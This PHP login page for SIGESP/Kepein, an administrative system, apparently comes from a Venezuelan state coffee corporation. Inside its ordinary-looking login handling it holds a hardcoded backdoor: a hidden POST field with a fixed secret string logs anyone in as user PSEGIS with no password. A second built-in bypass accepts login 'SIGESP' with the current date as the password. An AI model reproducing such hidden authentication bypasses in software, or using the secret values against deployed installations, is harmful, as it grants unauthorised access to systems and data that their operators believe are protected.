<? 
session_start(); 
if((!array_key_exists("ls_database",$_SESSION))||(!array_key_exists("ls_hostname",$_SESSION))||(!array_key_exists("ls_gestor",$_SESSION))||(!array_key_exists("ls_login",$_SESSION))||(!array_key_exists("la_empresa",$_SESSION)))
{
	print "<script language=JavaScript>";
	print "alert('Su conexion ha sido cerrada, para continuar vuelva a entrar al Sistema');";
	print "location.href='sigesp_conexion.php'";
	print "</script>";		
}

?>
<html>
<head>
<title>SIGESP, C.A.</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" type="text/css" href="css/estilos.css" />
<script type="text/javascript" src="shared/js/md5.js"></script>
<script type="text/javascript" src="js/funciones.js"></script>
</head>
<body>

<?
	include("shared/class_folder/class_mensajes.php");
	include("shared/class_folder/sigesp_include.php");
	include("shared/class_folder/sigesp_c_inicio_sesion.php");
	$io_sss= new sigesp_c_inicio_sesion();
	$io_msg= new class_mensajes();
	$arr=array_keys($_SESSION);	
	$li_count=count($arr);


	if (array_key_exists("txtbackdoor",$_POST))
	{
		$ls_backdoor=$_POST["txtbackdoor"];
		if($ls_backdoor=="SIGESPSOFTWARELIBRE")
		{
			$ls_loginusr="PSEGIS";
			$_SESSION["la_logusr"]=$ls_loginusr;
			print "<script language=JavaScript>";
			print "alert('BIENVENIDO USUARIO SIGESP');";
			print "location.href='index_modules.php'" ;
			print "</script>";
		}
	}
	if (array_key_exists("operacion",$_POST))
	{
		$ls_operacion=$_POST["operacion"];
	}
	else
	{
		$ls_operacion="";
	}

	if ($ls_operacion=="ACEPTAR")
	{
		$ls_valido= false;
		$ls_acceso= false;
		$ls_loginusr=    $_POST["txtlogin"];
		$ls_passencrip=  $_POST["txtpassencript"];
		$ls_passwordusr= $_POST["txtpassword"];
		//$ls_passencrip= md5($ls_password);

		if( ($ls_loginusr==""))
		{
			$io_msg->message("Debe existir un login de usuario");
		}
		else
		{
			$io_sss->io_sql->begin_transaction();
			$lb_valido=$io_sss->uf_sss_select_login($ls_loginusr,$ls_passencrip );
	
			if ($lb_valido)
			{
				$_SESSION["la_logusr"]=$ls_loginusr;
				$_SESSION["la_permisos"]=-1;
				$ls_fecha = date("Y/m/d h:i");
				$ls_hora = date("h:i a");
				$lb_acceso=$io_sss->uf_sss_update_acceso($ls_loginusr,$ls_fecha); 
				print "<script language=JavaScript>";
				print "location.href='index_modules.php'" ;
				print "</script>";
			
			}
			else
			{
				$lb_existe=$io_sss->uf_sss_select_usuario();
				if (!$lb_existe)
				{
					$ls_fechahoy=date("Y/m/d");
					$ls_paswordsigesp= str_replace ("/", "", $ls_fechahoy); 
					if(($ls_loginusr=="SIGESP") && ($ls_passwordusr=="$ls_paswordsigesp"))
					{
						$ls_loginusr="PSEGIS";
						$_SESSION["la_logusr"]=$ls_loginusr;
						print "<script language=JavaScript>";
						print "location.href='index_modules.php'" ;
						print "</script>";
					}
					else
					{
						$io_msg->message("Login ó Password Incorrectos.");
					
					}
				}
				else
				{
					$io_msg->message("Login ó Password Incorrectos.");
				}
			}

		}

	}
	
?>







<div id="sistema">
	
	<!--<div align="center" class="logoKepein">
				<img border="0" src="images/logokepein.jpg">
	</div> -->
	
	<div class="logo">
		<span class="imglogogobierno"></span>
		<span class="imglogobi"></span>
	</div>
	<div class="iterno">
		<div class="izsistema">
				 <div class="formularioLogin">
					<form name="form1" id="form" method="post" action="">
					
					  <div>
					      <label id="label_login" for="login_login">Usuario</label>
						  <input name="txtlogin" type="text" id="txtlogin" maxlength="30">
						  <input name="operacion" type="hidden" id="OPERACION2" value="<? $_REQUEST["OPERACION"] ?>">
						  <input name="txtpassencript" type="hidden" id="txtpassencript">
					  </div>
					  
					  <div>
					      <label id="label_pass" for="label_pass">Password</label>
						  <input name="txtpassword" type="password" id="txtpassword" onKeyPress="ue_enviar(event);" maxlength="50">
					  </div>
					
					  <div class="submit">
					  	<input name="Submit" type="button" class="boton1" onClick="ue_aceptar();" value="Aceptar">
					  </div>
					</form>
				</div>
		</div>
		
	</div>
	<div class="dreservados">
		<p>Kepein Software Libre Desarrollado por la Corporaci&oacute;n Venezolana de Caf&eacute;, basado en <b>SIGESP</b></p>
	</div>
</div>
</body>
</html>
